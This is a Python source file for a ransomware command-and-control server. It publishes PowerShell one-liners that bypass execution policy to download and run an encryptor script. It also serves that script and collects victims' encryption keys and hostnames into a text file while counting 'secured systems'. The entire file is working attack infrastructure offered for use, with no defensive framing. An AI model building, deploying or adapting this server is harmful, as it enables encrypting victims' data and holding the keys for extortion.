from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import socket
import os

# Global variable to track secured systems
secured_systems = set()

class KeyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            # Display a webpage with one-liner commands
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            html_content = f"""
            <html>
            <head><title>Ransomware Server</title></head>
            <body>
                <h1>Ransomware Server</h1>
                <p>One-liner for encryption:</p>
                <pre>powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://{self.headers['Host']}/script/encryptor.ps1 -OutFile encryptor.ps1; .\\encryptor.ps1"</pre>
                <p>One-liner for decryption:</p>
                <pre>powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://{self.headers['Host']}/script/decryptor.ps1 -OutFile decryptor.ps1; .\\decryptor.ps1"</pre>
                <p>Number of secured systems: {len(secured_systems)}</p>
            </body>
            </html>
            """
            self.wfile.write(html_content.encode('utf-8'))
        elif self.path.startswith('/script/'):
            # Serve the PowerShell scripts
            script_name = self.path.split('/')[-1]
            script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), script_name)
            if os.path.exists(script_path):
                self.send_response(200)
                self.send_header('Content-Type', 'application/octet-stream')
                self.send_header('Content-Disposition', f'attachment; filename="{script_name}"')
                self.end_headers()
                with open(script_path, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b'File not found.')
        elif self.path == '/stats':
            # Return the number of secured systems
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            response = {"secured_systems": len(secured_systems)}
            self.wfile.write(json.dumps(response).encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'Not Found')

    def do_POST(self):
        if self.path == '/store_key':
            try:
                # Get the content length from the headers
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode('utf-8')

                # Parse the JSON payload
                data = json.loads(post_data)

                # Extract the encryption key and hostname
                encryption_key = data.get('key')
                hostname = data.get('hostname')

                if not encryption_key or not hostname:
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(b"Bad Request: Missing 'key' or 'hostname'.")
                    return

                # Save the key and hostname
                with open('encryption_keys.txt', 'a') as f:
                    f.write(f"Hostname: {hostname}, Key: {encryption_key}\n")

                # Track the secured system
                secured_systems.add(hostname)

                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'Key and hostname received and stored.')
            except Exception as e:
                print(f"Error processing POST request: {e}")
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'Internal Server Error')
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'Not Found')

def get_local_ip():
    """Get the local machine's IP address."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
        return ip
    except Exception:
        return "127.0.0.1"

def run(server_class=HTTPServer, handler_class=KeyHandler, port=8000):
    local_ip = get_local_ip()
    print(f'Starting server on http://{local_ip}:{port}')
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    httpd.serve_forever()

if __name__ == '__main__':
    run()